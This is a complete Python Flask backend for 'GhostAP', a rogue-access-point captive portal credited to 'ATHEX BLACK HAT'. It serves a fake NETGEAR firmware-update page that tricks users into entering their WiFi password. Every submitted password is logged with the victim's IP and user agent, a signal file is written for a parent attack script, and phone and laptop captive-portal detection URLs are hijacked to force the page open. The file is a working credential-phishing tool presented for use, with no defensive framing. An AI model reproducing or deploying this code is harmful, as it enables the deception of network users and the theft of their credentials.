#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ======================================================================
#  GhostAP — Captive Portal Backend
#  Developer: ATHEX BLACK HAT
#  Version: 1.0.0
#  Description: Flask-based captive portal server
#               Serves fake router update page, captures WiFi passwords
# ======================================================================

import os
import sys
import re
import json
import hashlib
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, render_template_string, redirect, url_for, make_response
except ImportError:
    print("[!] Flask not installed. Run: pip3 install flask")
    sys.exit(1)

# ======================================================================
#  CONFIGURATION — can be overridden via environment variables
# ======================================================================

PORTAL_HOST = os.environ.get("PORTAL_HOST", "0.0.0.0")
PORTAL_PORT = int(os.environ.get("PORTAL_PORT", "80"))
LOG_FILE = os.environ.get("PASSWORD_FILE", "/tmp/ghostap_passwords.txt")
SIGNAL_FILE = os.environ.get("CAPTURE_SIGNAL", "/tmp/ghostap_captured")
TARGET_ESSID = os.environ.get("TARGET_ESSID", "Unknown Network")
PORTAL_TITLE = os.environ.get("PORTAL_TITLE", "Router Security Update")
PORTAL_COMPANY = os.environ.get("PORTAL_COMPANY", "NETGEAR")
PORTAL_THEME_COLOR = os.environ.get("PORTAL_THEME_COLOR", "#e94560")
PORTAL_LOGO_ENABLED = os.environ.get("PORTAL_LOGO_ENABLED", "true").lower() == "true"
DEBUG_MODE = os.environ.get("DEBUG", "false").lower() == "true"

# derived
LOG_DIR = os.path.dirname(LOG_FILE)

# ======================================================================
#  ENSURE DIRECTORIES EXIST
# ======================================================================
Path(LOG_DIR).mkdir(parents=True, exist_ok=True)

# ======================================================================
#  FLASK APP
# ======================================================================
app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()

# suppress flask banner in production
if not DEBUG_MODE:
    import logging
    log = logging.getLogger("werkzeug")
    log.setLevel(logging.ERROR)


# ======================================================================
#  TEMPLATES
# ======================================================================

LOGIN_TEMPLATE = r'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>{{ company }} — {{ title }}</title>
    <style>
        *, *::before, *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                         "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(160deg, #0a0a1a 0%, #0f0c29 25%,
                                               #1a1040 50%, #0d0d25 75%, #0a0a1a 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        /* animated background particles */
        body::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background:
                radial-gradient(circle at 20% 80%, rgba(255,255,255,0.015) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255,255,255,0.01) 0%, transparent 50%),
                radial-gradient(circle at 50% 50%, rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.03) 0%, transparent 60%);
            animation: drift 30s linear infinite;
            z-index: 0;
        }

        @keyframes drift {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 440px;
        }

        .card {
            background: rgba(18, 24, 40, 0.85);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 20px;
            padding: 44px 36px 36px;
            text-align: center;
            box-shadow:
                0 4px 6px rgba(0, 0, 0, 0.3),
                0 10px 40px rgba(0, 0, 0, 0.5),
                0 0 0 1px rgba(255, 255, 255, 0.06),
                inset 0 1px 0 rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .icon-wrapper {
            width: 72px;
            height: 72px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg,
                rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.2),
                rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.05));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.3);
            box-shadow: 0 0 30px rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.15);
        }

        .icon-lock {
            font-size: 32px;
            filter: drop-shadow(0 0 8px rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.6));
        }

        h2 {
            color: #e8ecf1;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: -0.2px;
            margin-bottom: 8px;
        }

        .subtitle {
            color: #7a8299;
            font-size: 13.5px;
            line-height: 1.65;
            margin-bottom: 20px;
            padding: 0 10px;
        }

        .network-badge {
            display: inline-flex;
            align-items: center;
            gap: 7px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            padding: 8px 18px;
            margin-bottom: 24px;
            color: {{ theme_color }};
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 0.3px;
        }

        .network-badge .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: {{ theme_color }};
            box-shadow: 0 0 8px {{ theme_color }};
            animation: pulse-dot 2s ease-in-out infinite;
        }

        @keyframes pulse-dot {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .form-group {
            text-align: left;
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            color: #b0b8cc;
            font-size: 12.5px;
            font-weight: 600;
            margin-bottom: 7px;
            letter-spacing: 0.3px;
            text-transform: uppercase;
        }

        .input-wrapper {
            position: relative;
        }

        input[type="password"] {
            width: 100%;
            padding: 14px 44px 14px 16px;
            background: rgba(10, 15, 28, 0.7);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: #e8ecf1;
            font-size: 15px;
            font-family: inherit;
            transition: all 0.25s ease;
            outline: none;
        }

        input[type="password"]:focus {
            border-color: {{ theme_color }};
            box-shadow: 0 0 0 4px rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.12);
            background: rgba(10, 15, 28, 0.9);
        }

        input[type="password"]::placeholder {
            color: rgba(255, 255, 255, 0.18);
            font-size: 14px;
        }

        .input-icon {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.25);
            font-size: 18px;
            pointer-events: none;
            transition: color 0.25s ease;
        }

        input[type="password"]:focus ~ .input-icon {
            color: {{ theme_color }};
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, {{ theme_color }},
                rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.85));
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 650;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.4px;
            position: relative;
            overflow: hidden;
        }

        .btn-submit:hover {
            filter: brightness(1.2);
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba({{ theme_r }}, {{ theme_g }}, {{ theme_b }}, 0.35);
        }

        .btn-submit:active {
            transform: translateY(0);
            filter: brightness(0.95);
            transition: all 0.1s ease;
        }

        .footer-note {
            color: #495670;
            font-size: 11px;
            margin-top: 20px;
            letter-spacing: 0.2px;
        }

        .footer-note span {
            color: {{ theme_color }};
            font-weight: 600;
        }

        /* error state */
        .error-msg {
            color: #ff6b6b;
            font-size: 12px;
            margin-top: 8px;
            text-align: left;
            display: none;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-4px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="icon-wrapper">
                <span class="icon-lock">&#128274;</span>
            </div>
            <h2>{{ title }}</h2>
            <p class="subtitle">A critical firmware security patch is available for your router. Please verify your network credentials to proceed with the update.</p>
            <div class="network-badge">
                <span class="dot"></span>
                Network: {{ essid }}
            </div>
            <form method="POST" action="/" id="login-form" autocomplete="off">
                <div class="form-group">
                    <label>WiFi Password</label>
                    <div class="input-wrapper">
                        <input type="password"
                               name="password"
                               id="password"
                               placeholder="Enter your WiFi password"
                               required
                               autofocus
                               autocomplete="off"
                               autocorrect="off"
                               autocapitalize="off"
                               spellcheck="false">
                        <span class="input-icon">&#128477;</span>
                    </div>
                    <div class="error-msg" id="error-msg">Please enter a valid password.</div>
                </div>
                <button type="submit" class="btn-submit">Verify &amp; Install Update</button>
            </form>
            <p class="footer-note">Secured by <span>{{ company }}</span> &bull; Connection will resume automatically after verification</p>
        </div>
    </div>

    <script>
        // prevent form resubmission on refresh
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }

        // basic client-side validation
        document.getElementById('login-form').addEventListener('submit', function(e) {
            var pwd = document.getElementById('password').value.trim();
            var error = document.getElementById('error-msg');

            if (pwd.length < 1) {
                e.preventDefault();
                error.style.display = 'block';
                error.textContent = 'Password cannot be empty.';
                return false;
            }

            if (pwd.length > 64) {
                e.preventDefault();
                error.style.display = 'block';
                error.textContent = 'Password is too long.';
                return false;
            }

            error.style.display = 'none';
            return true;
        });
    </script>
</body>
</html>
'''


SUCCESS_TEMPLATE = r'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="5;url=/">
    <title>Update Complete — {{ company }}</title>
    <style>
        *, *::before, *::after {
            margin: 0; padding: 0; box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                         "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(160deg, #0a0a1a 0%, #0f0c29 25%,
                                               #1a1040 50%, #0d0d25 75%, #0a0a1a 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .card {
            background: rgba(18, 24, 40, 0.85);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 20px;
            padding: 48px 36px 40px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow:
                0 4px 6px rgba(0, 0, 0, 0.3),
                0 10px 40px rgba(0, 0, 0, 0.5),
                0 0 0 1px rgba(255, 255, 255, 0.06);
        }

        .check-icon {
            font-size: 72px;
            margin-bottom: 24px;
            animation: pop-in 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes pop-in {
            0% { transform: scale(0); opacity: 0; }
            70% { transform: scale(1.15); }
            100% { transform: scale(1); opacity: 1; }
        }

        h2 {
            color: #00e676;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .message {
            color: #8892b0;
            font-size: 14px;
            line-height: 1.7;
            margin-bottom: 28px;
        }

        .progress-container {
            height: 4px;
            background: rgba(255, 255, 255, 0.06);
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00e676, #00c853);
            border-radius: 2px;
            animation: fill-bar 3s ease forwards;
        }

        @keyframes fill-bar {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        .countdown {
            color: #495670;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="check-icon">&#9989;</div>
        <h2>Firmware Updated Successfully</h2>
        <p class="message">
            Your router is now protected with the latest security patch.<br>
            You will be reconnected to your network automatically.
        </p>
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        <p class="countdown">Redirecting in a few seconds...</p>
    </div>
</body>
</html>
'''


# ======================================================================
#  HELPER: LOG CAPTURED PASSWORD
# ======================================================================
def log_capture(essid, password, ip, user_agent):
    """Write captured credentials to log file and signal file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # structured log entry
    log_entry = (
        f"[{timestamp}] "
        f"ESSID: {essid} | "
        f"Password: {password} | "
        f"IP: {ip} | "
        f"UA: {user_agent}\n"
    )

    # append to password log
    try:
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
    except IOError as e:
        print(f"[!] Failed to write log: {e}", file=sys.stderr)

    # create capture signal file (triggers parent script)
    try:
        with open(SIGNAL_FILE, "w") as sf:
            sf.write(password)
    except IOError as e:
        print(f"[!] Failed to write signal: {e}", file=sys.stderr)

    # console output
    print("", flush=True)
    print("=" * 58, flush=True)
    print("  🔑  PASSWORD CAPTURED", flush=True)
    print("=" * 58, flush=True)
    print(f"  ESSID     : {essid}", flush=True)
    print(f"  Password  : {password}", flush=True)
    print(f"  Victim IP : {ip}", flush=True)
    print(f"  User Agent: {user_agent[:60]}...", flush=True)
    print(f"  Timestamp : {timestamp}", flush=True)
    print(f"  Log File  : {LOG_FILE}", flush=True)
    print("=" * 58, flush=True)
    print("", flush=True)


# ======================================================================
#  HELPER: PARSE THEME COLOR
# ======================================================================
def parse_theme_color(hex_color):
    """Convert hex color to RGB tuple."""
    hex_color = hex_color.lstrip("#")
    try:
        return (
            int(hex_color[0:2], 16),
            int(hex_color[2:4], 16),
            int(hex_color[4:6], 16),
        )
    except (ValueError, IndexError):
        return (233, 69, 96)  # default red-pink


# ======================================================================
#  ROUTES
# ======================================================================

@app.route("/", methods=["GET", "POST"])
def index():
    """Main captive portal route."""

    if request.method == "POST":
        password = request.form.get("password", "").strip()
        ip = request.remote_addr or "0.0.0.0"
        user_agent = request.headers.get("User-Agent", "Unknown")

        # skip empty passwords
        if not password:
            return redirect(url_for("index"))

        # log the capture
        log_capture(TARGET_ESSID, password, ip, user_agent)

        # render success page
        theme = parse_theme_color(PORTAL_THEME_COLOR)
        return render_template_string(
            SUCCESS_TEMPLATE,
            company=PORTAL_COMPANY,
        )

    # GET request — show login page
    theme = parse_theme_color(PORTAL_THEME_COLOR)
    return render_template_string(
        LOGIN_TEMPLATE,
        title=PORTAL_TITLE,
        company=PORTAL_COMPANY,
        essid=TARGET_ESSID,
        theme_color=PORTAL_THEME_COLOR,
        theme_r=theme[0],
        theme_g=theme[1],
        theme_b=theme[2],
    )


@app.route("/generate_204", methods=["GET"])
@app.route("/hotspot-detect.html", methods=["GET"])
@app.route("/library/test/success.html", methods=["GET"])
@app.route("/redirect", methods=["GET"])
@app.route("/fwlink", methods=["GET"])
@app.route("/connecttest.txt", methods=["GET"])
def captive_detect():
    """Common captive portal detection endpoints — redirect to login."""
    return redirect(url_for("index"))


@app.route("/ping", methods=["GET"])
def ping():
    """Health check endpoint."""
    return {"status": "ok", "essid": TARGET_ESSID, "timestamp": datetime.now().isoformat()}


@app.route("/status", methods=["GET"])
def status():
    """Status endpoint — shows if password has been captured."""
    if os.path.exists(SIGNAL_FILE):
        try:
            with open(SIGNAL_FILE, "r") as f:
                captured_password = f.read().strip()
            return {
                "captured": True,
                "password_length": len(captured_password),
                "timestamp": datetime.now().isoformat(),
            }
        except IOError:
            pass
    return {"captured": False, "timestamp": datetime.now().isoformat()}


# catch-all for any other path
@app.route("/<path:path>", methods=["GET", "POST"])
def catch_all(path):
    """Redirect all unknown paths to the login page."""
    return redirect(url_for("index"))


# ======================================================================
#  ERROR HANDLERS
# ======================================================================

@app.errorhandler(404)
def not_found(e):
    return redirect(url_for("index"))


@app.errorhandler(500)
def server_error(e):
    return redirect(url_for("index"))


# ======================================================================
#  ENTRY POINT
# ======================================================================
if __name__ == "__main__":
    print("", flush=True)
    print("═" * 50, flush=True)
    print("  GhostAP — Captive Portal", flush=True)
    print("  Developer: ATHEX BLACK HAT", flush=True)
    print("═" * 50, flush=True)
    print(f"  Target ESSID : {TARGET_ESSID}", flush=True)
    print(f"  Listening on : {PORTAL_HOST}:{PORTAL_PORT}", flush=True)
    print(f"  Log file     : {LOG_FILE}", flush=True)
    print(f"  Signal file  : {SIGNAL_FILE}", flush=True)
    print("═" * 50, flush=True)
    print("", flush=True)
    print("  Waiting for victim connection...", flush=True)
    print("", flush=True)

    app.run(
        host=PORTAL_HOST,
        port=PORTAL_PORT,
        debug=DEBUG_MODE,
        threaded=True,
    )